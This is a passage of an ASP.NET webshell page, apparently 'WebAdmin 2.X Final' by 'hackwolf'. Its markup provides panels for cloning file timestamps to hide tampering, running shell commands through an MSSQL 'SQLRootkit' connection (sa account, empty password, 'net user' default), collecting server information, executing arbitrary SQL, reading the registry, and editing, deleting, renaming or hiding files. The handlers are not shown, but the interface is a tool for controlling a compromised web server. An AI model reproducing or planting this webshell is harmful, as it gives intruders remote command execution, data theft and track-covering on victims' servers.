            <asp:TextBox class="TextBox" id="time1" runat="server" Wrap="False" Width="400px">c:\webadmin2XF.aspx</asp:TextBox>
            <br />
            <asp:Label id="Label_copied" runat="server">Copied File or Dir : </asp:Label>
            <asp:TextBox class="TextBox" id="time2" runat="server" Wrap="False" Width="400px">c:\index.aspx</asp:TextBox>
            <br />
            <asp:Button class="buttom" id="Button_clone" onclick="GoCloneTime" runat="server" Text="Clone"></asp:Button>
            <br />
            <asp:Label id="Label_cloneResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="SQLRootkit" runat="server" Wrap="False" ToolTip="SQLRootKit" Visible="False">
            <asp:Label id="Label_conn" runat="server" width="100px">ConnString:</asp:Label>
            <asp:TextBox class="TextBox" id="ConStr" runat="server" Wrap="False" Width="500px">server=127.0.0.1;UID=sa;PWD=;Provider=SQLOLEDB</asp:TextBox>
            <br />
            <asp:Label id="Label_sqlcmd" runat="server" width="100px">Command:</asp:Label>
            <asp:TextBox class="TextBox" id="SQLCmd" runat="server" Wrap="False" Width="500px">net user</asp:TextBox>
            <asp:Button class="buttom" id="SQLCmdRun" onclick="CMDSHELL" runat="server" Text="Run"></asp:Button>
            <br />
            <asp:Label id="resultSQL" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="SysInfo" runat="server" Wrap="False" ToolTip="System Infomation" Visible="False" EnableViewState="False">
            <table width="80%" align="center" border="1">
                <tbody>
                    <tr>
                        <td colspan="2">
                            Web Server Information</td>
                    </tr>
                    <tr>
                        <td width="40%">
                            Server IP</td>
                        <td width="60%">
                            <asp:Label id="ServerIP" runat="server" enableviewstate="False"></asp:Label></td>
                    </tr>
                    <tr>
                        <td height="73">
                            Machine Name</td>
                        <td>
                            <asp:Label id="MachineName" runat="server" enableviewstate="False"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            Network Name</td>
                        <td>
                            <asp:Label id="UserDomainName" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            User Name in this Process</td>
                        <td>
                            <asp:Label id="UserName" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            OS Version</td>
                        <td>
                            <asp:Label id="OS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            Started Time</td>
                        <td>
                            <asp:Label id="StartTime" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            System Time</td>
                        <td>
                            <asp:Label id="NowTime" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            IIS Version</td>
                        <td>
                            <asp:Label id="IISV" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            HTTPS</td>
                        <td>
                            <asp:Label id="HTTPS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            PATH_INFO</td>
                        <td>
                            <asp:Label id="PATHS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            PATH_TRANSLATED</td>
                        <td>
                            <asp:Label id="PATHS2" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            SERVER_PORT</td>
                        <td>
                            <asp:Label id="PORT" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            SeesionID</td>
                        <td>
                            <asp:Label id="SID" runat="server"></asp:Label></td>
                    </tr>
                </tbody>
            </table>
        </asp:Panel>
        <asp:Panel id="DATA" runat="server" Wrap="False" ToolTip="Manage Database" Visible="False">
            <asp:Label id="label_datacs" runat="server" width="120px">ConnString :</asp:Label>
            <asp:TextBox class="TextBox" id="DataCStr" runat="server" Wrap="False" Width="500px">Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\MyWeb\UpdateWebadmin\guestbook.mdb</asp:TextBox>
            <br />
            <asp:Label id="Label_datatype" runat="server" width="120px">Database Type:</asp:Label>
            <asp:RadioButton id="Type_SQL" runat="server" Text="MSSQL" Width="80px" CssClass="buttom" OnCheckedChanged="DB_onrB_1" GroupName="DBType" AutoPostBack="True"></asp:RadioButton>
            <asp:RadioButton id="Type_Acc" runat="server" Text="Access" Width="80px" CssClass="buttom" OnCheckedChanged="DB_onrB_2" GroupName="DBType" AutoPostBack="True" Checked="True"></asp:RadioButton>
            <asp:Button class="buttom" id="DB_Submit" onclick="DB_Submit_Click" runat="server" Text="Submit" Width="80px"></asp:Button>
            <br />
            <asp:Label id="db_showTable" runat="server"></asp:Label>
            <br />
            <asp:Label id="DB_exe" runat="server" height="37px" visible="False">Execute SQL :</asp:Label>
            <asp:TextBox id="DB_EString" runat="server" TextMode="MultiLine" Visible="false" Width="500" CssClass="TextBox" Height="50px"></asp:TextBox>
            <asp:Button id="DB_eButton" onclick="DB_Exec_Click" runat="server" Text="Exec" Visible="false" CssClass="buttom"></asp:Button>
            <br />
            <asp:Label id="DB_ExecRes" runat="server"></asp:Label>
            <br />
            <asp:DataGrid id="DB_DataGrid" runat="server" Width="800px" with="100%" AllowPaging="true" AllowSorting="true" OnSortCommand="DB_Sort" PageSize="20" OnPageIndexChanged="DB_Page" PagerStyle-Mode="NumericPages">
                <PagerStyle mode="NumericPages"></PagerStyle>
            </asp:DataGrid>
        </asp:Panel>
        <asp:Panel id="reg" runat="server" Wrap="False" ToolTip="Read Regedit" Visible="False">
            <asp:Label id="label_rkey" runat="server" width="80px">Key :</asp:Label>
            <asp:TextBox class="TextBox" id="RegKey" runat="server" Wrap="False" Width="500px">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName</asp:TextBox>
            <br />
            <asp:Label id="label_rV" runat="server" width="80px">Value:</asp:Label>
            <asp:TextBox class="TextBox" id="RegValue" runat="server" Wrap="False" Width="200px">ComputerName</asp:TextBox>
            <asp:Button class="buttom" id="ReadReg_Click" onclick="ReadReg" runat="server" Text="Read"></asp:Button>
            <br />
            <br />
            <asp:Label id="RegResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="about" runat="server" Wrap="False" ToolTip="about WebAdmin 2.X Final" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            <br />
            <br />
            <asp:Label id="label_about" runat="server" width="80px">WebAdmin 2.X Final is a webshell
            run in ASP.Net code by&nbsp;</asp:Label>
            <asp:HyperLink id="HyperLink1" runat="server" Visible="True" Target="_blank" NavigateUrl="http://canglangjidi.qyun.net">hackwolf</asp:HyperLink>
            <br />
            <asp:Image id="Image1" runat="server" ToolTip="Build20051225" Visible="True" ImageUrl="http://j.thec.cn/canglangjidi/cljd.jpg" AlternateText="Enjoy Hacking !"></asp:Image>
        </asp:Panel>
        <asp:Panel id="File_Edit" runat="server" Wrap="False" ToolTip="Edit File" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:Label id="label_path" runat="server">File Path : </asp:Label>
            <asp:TextBox id="edited_path" runat="server" Width="300" CssClass="TextBox"></asp:TextBox>
            * 
            <br />
            <asp:TextBox id="edited_content" runat="server" TextMode="MultiLine" CssClass="TextBox" Columns="100" Rows="25"></asp:TextBox>
            <br />
            <asp:Button id="edited_Edit" onclick="FileEdit" runat="server" Text="Sumbit" CssClass="buttom"></asp:Button>
        </asp:Panel>
        <asp:Panel id="File_del" runat="server" Wrap="False" ToolTip="Delete File" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:Label id="label_del" runat="server"></asp:Label>
            <br />
            <asp:Button id="del_del" onclick="FileDel" runat="server" Text="Delete It" CssClass="buttom"></asp:Button>
        </asp:Panel>
        <asp:Panel id="File_Rename" runat="server" Wrap="False" ToolTip="Delete File" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:TextBox class="TextBox" id="btn_rename" runat="server" Wrap="False" Width="200px"></asp:TextBox>
            <asp:Button id="rn_rn" onclick="rn_rn_Click" runat="server" Text="Rename It" CssClass="buttom"></asp:Button>
        </asp:Panel>
        <asp:Panel id="File_Att" runat="server" Wrap="False" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:CheckBox class="TextBox" id="onlyread" Wrap="false" Text="ReadOnly" Width="100px" Runat="server"></asp:CheckBox>
            <asp:CheckBox class="TextBox" id="hide" Wrap="false" Text="hide" Width="100px" Runat="server"></asp:CheckBox>
            <asp:CheckBox class="TextBox" id="sys" Wrap="false" Text="sys" Width="100px" Runat="server"></asp:CheckBox>
            <asp:CheckBox class="TextBox" id="archive" Wrap="false" Text="archive" Width="100px" Runat="server"></asp:CheckBox>
            <br />
            <asp:Button id="Set_Att" onclick="Set_Att_Click" runat="server" Text="Set It" CssClass="buttom"></asp:Button>
        </asp:Panel>
        </form>
        </body>
        </html>
